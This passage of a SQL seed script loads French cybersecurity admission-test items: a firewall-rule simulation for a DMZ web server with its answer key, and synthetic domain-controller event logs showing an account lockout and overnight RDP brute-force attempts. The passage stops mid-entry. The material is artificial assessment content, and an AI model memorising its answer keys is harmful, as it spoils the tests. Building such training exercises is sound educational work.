            "type": "exists",
            "path": "/var/backups/sauvegarde-2026-10-31.tar.gz"
          },
          {
            "type": "exists",
            "path": "/var/backups/sauvegarde-2026-11-01.tar.gz"
          },
          {
            "type": "exists",
            "path": "/var/log/syslog"
          },
          {
            "type": "exists",
            "path": "/var/log/auth.log"
          },
          {
            "type": "disk_below",
            "mount": "/var",
            "percent": 90
          }
        ]
      }
    },
    {
      "id": "relance",
      "title": "Service sauvegarde-nuit relancé et actif",
      "check": {
        "type": "service_active",
        "name": "sauvegarde-nuit"
      }
    },
    {
      "id": "boot",
      "title": "Service activé au démarrage du serveur",
      "check": {
        "type": "service_enabled",
        "name": "sauvegarde-nuit"
      }
    }
  ]
}$q$::jsonb, null);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'sim', $q$Ticket #2071 : le serveur web de l'école (srv-dmz, 10.0.1.10) vient d'être placé en DMZ. Configurez les règles du pare-feu pour ce serveur, puis appliquez. Le pare-feu bloque tout ce qu'aucune règle n'autorise, et les règles sont lues de haut en bas.$q$, $q${"kind":"fwweb","help":false,"ticket":["Le site doit être accessible à tout le monde en HTTP (80) et HTTPS (443).","SSH (22) seulement depuis le réseau d'administration 10.0.99.0/24.","La supervision 10.0.99.5 interroge le serveur en SNMP (UDP 161).","Rien d'autre : ni base de données, ni bureau à distance depuis l'extérieur."],"rules":[{"action":"pass","proto":"any","src":"any","port":"any","descr":"Règle temporaire de l'installateur (tout autoriser)"}],"samples":[{"id":"w1","label":"Visiteur du site (HTTPS)","src_ip":"88.12.4.9","dst_port":443,"protocol":"tcp"},{"id":"w2","label":"Visiteur du site (HTTP)","src_ip":"77.141.2.30","dst_port":80,"protocol":"tcp"},{"id":"w3","label":"Admin depuis le réseau d'administration (SSH)","src_ip":"10.0.99.14","dst_port":22,"protocol":"tcp"},{"id":"w4","label":"Robot sur Internet (SSH)","src_ip":"185.220.101.7","dst_port":22,"protocol":"tcp"},{"id":"w5","label":"Poste du LAN élèves (SSH)","src_ip":"10.0.20.55","dst_port":22,"protocol":"tcp"},{"id":"w6","label":"Supervision (SNMP)","src_ip":"10.0.99.5","dst_port":161,"protocol":"udp"}]}$q$::jsonb, 4, $q$Cybersécurité (activité)$q$, 480, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"packets":[{"id":"w1","label":"Visiteur du site (HTTPS)","src_ip":"88.12.4.9","dst_port":443,"protocol":"tcp","expected":"allow"},{"id":"w2","label":"Visiteur du site (HTTP)","src_ip":"77.141.2.30","dst_port":80,"protocol":"tcp","expected":"allow"},{"id":"w3","label":"Admin depuis le réseau d'administration (SSH)","src_ip":"10.0.99.14","dst_port":22,"protocol":"tcp","expected":"allow"},{"id":"w4","label":"Robot sur Internet (SSH)","src_ip":"185.220.101.7","dst_port":22,"protocol":"tcp","expected":"block"},{"id":"w5","label":"Poste du LAN élèves (SSH)","src_ip":"10.0.20.55","dst_port":22,"protocol":"tcp","expected":"block"},{"id":"w6","label":"Supervision (SNMP)","src_ip":"10.0.99.5","dst_port":161,"protocol":"udp","expected":"allow"},{"id":"w7","label":"SNMP depuis Internet","src_ip":"45.83.64.2","dst_port":161,"protocol":"udp","expected":"block"},{"id":"w8","label":"Base de données depuis Internet","src_ip":"45.83.64.2","dst_port":3306,"protocol":"tcp","expected":"block"},{"id":"w9","label":"RDP depuis Internet","src_ip":"91.92.93.94","dst_port":3389,"protocol":"tcp","expected":"block"},{"id":"w10","label":"HTTPS depuis le LAN élèves","src_ip":"10.0.20.12","dst_port":443,"protocol":"tcp","expected":"allow"}]}$q$::jsonb);
    update tests set activity_minutes = 45, duration_minutes = 95, pass_mark = null where id = v_test;
    raise notice '% : % questions au total', $q$Admission Bachelor 3 Cybersécurité 2026$q$, (select count(*) from questions where test_id = v_test);
  end if;
  select id into v_test from tests where title = $q$Admission Mastère Cybersécurité (M1) 2026$q$ order by created_at desc limit 1;
  if v_test is null then raise notice 'Épreuve introuvable : %', $q$Admission Mastère Cybersécurité (M1) 2026$q$; else
    delete from questions where test_id = v_test and id in (select question_id from question_externals where tool = 'win95');
    delete from questions where test_id = v_test and domain like '%(activité)';
    select coalesce(max(position), 0) into v_pos from questions where test_id = v_test;
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'evtx', $q$Ticket du SOC : « le compte de Jeanne Dupont (j.dupont) se verrouille tous les matins vers 8 h ». Vous avez les journaux du contrôleur de domaine. Trouvez la cause, puis vérifiez s'il ne s'est rien passé d'autre pendant la nuit du 26 au 27 octobre.$q$, $q${"help":false,"logs":[{"log":"Système","level":"Information","time":"2026-10-25 06:00:23","source":"Service Control Manager","eventId":7036,"task":"Aucune","computer":"SRV-DC01.ecole.local","message":"Le service Windows Update est entré dans l'état : en cours d'exécution.","data":{},"rid":48210},{"log":"Application","level":"Information","time":"2026-10-25 06:30:02","source":"VSS","eventId":8224,"task":"Aucune","computer":"SRV-DC01.ecole.local","message":"Le service de cliché instantané des volumes est arrêté en raison du délai d'inactivité.","data":{},"rid":48211},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 07:20:01","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-04\nAdresse du réseau source : 10.20.7.20","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-PEDA-04"},"rid":48212},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 07:21:34","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : m.durand\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.4.11","data":{"TargetUserName":"m.durand","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48213},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-25 07:55:10","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48214},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-25 07:55:19","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48215},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-25 07:56:28","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48216},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-25 07:56:37","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48217},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-25 07:57:46","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48218},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 07:58:01","source":"Microsoft-Windows-Security-Auditing","eventId":4740,"task":"User Account Management","computer":"SRV-DC01.ecole.local","message":"Le compte d'un utilisateur a été verrouillé.\n\nCompte verrouillé :\n  Nom du compte : j.dupont\nInformations supplémentaires :\n  Nom de l'ordinateur appelant : PC-COMPTA-07","data":{"TargetUserName":"j.dupont","CallerComputerName":"PC-COMPTA-07"},"rid":48219},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 09:44:55","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : l.garcia\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.6.23","data":{"TargetUserName":"l.garcia","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48220},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 10:02:40","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-11\nAdresse du réseau source : 10.20.1.140","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-PEDA-11"},"rid":48221},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 10:17:01","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : c.morel\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-11\nAdresse du réseau source : 10.20.7.21","data":{"TargetUserName":"c.morel","LogonType":"3","WorkstationName":"PC-PEDA-11"},"rid":48222},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 10:50:09","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : m.durand\nDomaine : ECOLE\nNom de la station de travail : PC-ACCUEIL-02\nAdresse du réseau source : 10.20.3.68","data":{"TargetUserName":"m.durand","LogonType":"3","WorkstationName":"PC-ACCUEIL-02"},"rid":48223},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 12:03:30","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : l.garcia\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.5.163","data":{"TargetUserName":"l.garcia","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48224},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 12:32:38","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-04\nAdresse du réseau source : 10.20.8.135","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-PEDA-04"},"rid":48225},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 13:05:54","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : l.garcia\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.9.176","data":{"TargetUserName":"l.garcia","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48226},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 13:28:50","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : a.benali\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-04\nAdresse du réseau source : 10.20.9.190","data":{"TargetUserName":"a.benali","LogonType":"3","WorkstationName":"PC-PEDA-04"},"rid":48227},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 14:40:29","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : a.benali\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.2.113","data":{"TargetUserName":"a.benali","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48228},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 14:45:19","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : a.benali\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.3.145","data":{"TargetUserName":"a.benali","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48229},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 15:08:47","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.2.99","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48230},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-25 16:56:50","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-11\nAdresse du réseau source : 10.20.8.72","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-PEDA-11"},"rid":48231},{"log":"Système","level":"Information","time":"2026-10-26 06:00:41","source":"Service Control Manager","eventId":7036,"task":"Aucune","computer":"SRV-DC01.ecole.local","message":"Le service Windows Update est entré dans l'état : en cours d'exécution.","data":{},"rid":48232},{"log":"Application","level":"Information","time":"2026-10-26 06:30:02","source":"VSS","eventId":8224,"task":"Aucune","computer":"SRV-DC01.ecole.local","message":"Le service de cliché instantané des volumes est arrêté en raison du délai d'inactivité.","data":{},"rid":48233},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-26 07:55:10","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48234},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-26 07:55:19","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48235},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-26 07:56:28","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48236},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-26 07:56:37","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48237},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 07:57:44","source":"Microsoft-Windows-Security-Auditing","eventId":4740,"task":"User Account Management","computer":"SRV-DC01.ecole.local","message":"Le compte d'un utilisateur a été verrouillé.\n\nCompte verrouillé :\n  Nom du compte : j.dupont\nInformations supplémentaires :\n  Nom de l'ordinateur appelant : PC-COMPTA-07","data":{"TargetUserName":"j.dupont","CallerComputerName":"PC-COMPTA-07"},"rid":48238},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-26 07:57:46","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48239},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 08:45:36","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-11\nAdresse du réseau source : 10.20.6.165","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-PEDA-11"},"rid":48240},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 10:51:04","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : l.garcia\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.2.44","data":{"TargetUserName":"l.garcia","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48241},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 12:09:13","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : c.morel\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.7.62","data":{"TargetUserName":"c.morel","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48242},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 12:31:59","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-ACCUEIL-02\nAdresse du réseau source : 10.20.5.81","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-ACCUEIL-02"},"rid":48243},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 12:34:29","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-04\nAdresse du réseau source : 10.20.5.136","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-PEDA-04"},"rid":48244},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 12:34:59","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : c.morel\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.6.182","data":{"TargetUserName":"c.morel","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48245},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 13:11:48","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.7.183","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48246},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 13:21:38","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-04\nAdresse du réseau source : 10.20.6.43","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-PEDA-04"},"rid":48247},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 13:53:22","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-04\nAdresse du réseau source : 10.20.2.85","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-PEDA-04"},"rid":48248},{"log":"Application","level":"Erreur","time":"2026-10-26 14:22:10","source":"Application Error","eventId":1000,"task":"(100)","computer":"SRV-DC01.ecole.local","message":"Nom de l'application défaillante : comptapro.exe, version : 12.4.0\nCode d'exception : 0xc0000005","data":{},"rid":48249},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 15:15:46","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : c.morel\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.7.131","data":{"TargetUserName":"c.morel","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48250},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 15:31:41","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : l.garcia\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.6.22","data":{"TargetUserName":"l.garcia","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48251},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 16:47:34","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.5.15","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48252},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 17:11:56","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-11\nAdresse du réseau source : 10.20.8.77","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-PEDA-11"},"rid":48253},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-26 18:51:34","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : c.morel\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.7.199","data":{"TargetUserName":"c.morel","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48254},{"log":"Système","level":"Avertissement","time":"2026-10-26 22:40:03","source":"Microsoft-Windows-Time-Service","eventId":129,"task":"Aucune","computer":"SRV-DC01.ecole.local","message":"NtpClient n'a pas pu définir un homologue de domaine à utiliser comme source de temps.","data":{},"rid":48255},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:00:05","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : backup\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48256},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:00:09","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : admin.local\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 